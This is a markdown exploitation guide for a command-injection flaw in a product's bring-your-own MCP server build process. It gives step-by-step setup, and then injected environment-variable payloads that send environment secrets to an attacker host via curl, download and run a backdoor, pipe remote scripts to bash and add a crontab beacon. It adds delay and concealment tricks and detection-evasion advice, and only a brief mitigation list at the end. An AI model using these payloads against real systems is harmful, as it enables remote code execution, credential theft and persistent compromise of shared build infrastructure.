# BYO Server Exploitation Guide

This document outlines how to exploit the Natoma BYO server vulnerability using this malicious MCP server.

## Attack Overview

The vulnerability exists in Natoma's BYO (Bring Your Own) server deployment process. When users provide environment variables for their MCP servers, these variables are processed without proper sanitization during the Cloud Build process, allowing for command injection.

## Step-by-Step Exploitation

### Step 1: Deploy the Repository

1. Push this mal-mcp repository to GitHub (or any Git hosting service)
2. Make the repository public or ensure Natoma can access it

### Step 2: Create BYO Server in Natoma

Go to the Natoma application and create a new BYO server with these parameters:

**Basic Configuration:**
```json
{
  "name": "Legitimate Security Scanner",
  "description": "A security scanning tool for compliance",
  "sourceType": "REPOSITORY",
  "repositorySource": {
    "repositoryUrl": "https://github.com/your-username/mal-mcp.git",
    "branchName": "main",
    "workingDirectory": "."
  }
}
```

### Step 3: Inject Malicious Environment Variables

The critical part is the environment variables. Here are various payloads:

#### Payload 1: Basic Command Execution
```json
{
  "envVars": {
    "MALICIOUS_PAYLOAD": "$(curl http://your-server.com/log-pwned.txt)",
    "NORMAL_VAR": "legitimate_value"
  }
}
```

#### Payload 2: Data Exfiltration
```json
{
  "envVars": {
    "DATABASE_URL": "postgresql://$(whoami):$(hostname)@your-server.com/stolen",
    "API_KEY": "$(env | base64 | curl -X POST -d @- http://your-server.com/exfiltrate)"
  }
}
```

#### Payload 3: Persistent Backdoor
```json
{
  "envVars": {
    "EXPLOIT_CMD": "; wget http://your-server.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh &",
    "CLEANUP": "$(rm -f /tmp/backdoor.sh 2>/dev/null || true)"
  }
}
```

#### Payload 4: Advanced Multi-Stage Attack
```json
{
  "envVars": {
    "STAGE1": "$(curl -s http://your-server.com/stage1.sh | bash)",
    "EXFIL_URL": "http://your-server.com/collect",
    "TARGET_FILES": "/etc/passwd /etc/hosts /proc/version",
    "PERSISTENCE": "$(echo '* * * * * curl http://your-server.com/beacon' | crontab -)"
  }
}
```

### Step 4: Monitor Exploitation

Set up a simple HTTP server to catch the exploitation:

```bash
# Simple Python server to log requests
python3 -m http.server 8080

# Or use netcat to catch data
nc -lvp 8080
```

### Step 5: Exploitation Results

When Natoma processes the BYO server:

1. **Cloud Build starts** and clones the repository
2. **Environment variables are processed** during container build
3. **Command injection executes** in the Cloud Build environment
4. **Malicious commands run** with Cloud Build service account permissions
5. **Data is exfiltrated** to attacker-controlled servers
6. **Backdoors may be installed** in the resulting container

## What Gets Compromised

### During Build Process:
- **Build environment secrets** (service account keys, API tokens)
- **Internal network access** from Cloud Build
- **Other build artifacts** and logs
- **Cloud metadata service** access

### In Deployed Container:
- **Runtime environment variables**
- **Container filesystem access**
- **Network access** from Cloud Run
- **Potential lateral movement** to other services

## Advanced Techniques

### Steganography in Environment Variables
Hide malicious commands in seemingly legitimate values:

```json
{
  "DATABASE_URL": "postgresql://user:pass@db.example.com/app$(curl http://evil.com)extra",
  "LOG_LEVEL": "info; curl http://evil.com/beacon; echo debug"
}
```

### Time-Delayed Execution
Use sleep commands to avoid immediate detection:

```json
{
  "DELAYED_PAYLOAD": "$(sleep 300 && curl http://evil.com/delayed-attack.sh | bash)"
}
```

### Environment Variable Chain Loading
Use one environment variable to load others:

```json
{
  "LOADER": "$(curl -s http://evil.com/env-vars.txt | source /dev/stdin)"
}
```

## Detection Evasion

1. **Use legitimate-sounding names** for environment variables
2. **Mix malicious and legitimate variables**
3. **Use common tools** (curl, wget) that might be expected
4. **Encode payloads** using base64 or other encoding
5. **Use multiple stages** to avoid detection

## Impact Assessment

This vulnerability allows attackers to:

- **Execute arbitrary code** on Google Cloud Build infrastructure
- **Access internal networks** and services
- **Steal credentials** and API keys
- **Install persistent backdoors**
- **Compromise multi-tenant environment**
- **Escalate to full infrastructure compromise**

## Mitigation

The vulnerability can be mitigated by:

1. **Input sanitization** of all environment variables
2. **Allow-listing** of permitted environment variable patterns
3. **Sandboxing** the build environment
4. **Monitoring** build logs for suspicious activity
5. **Limiting** build service account permissions
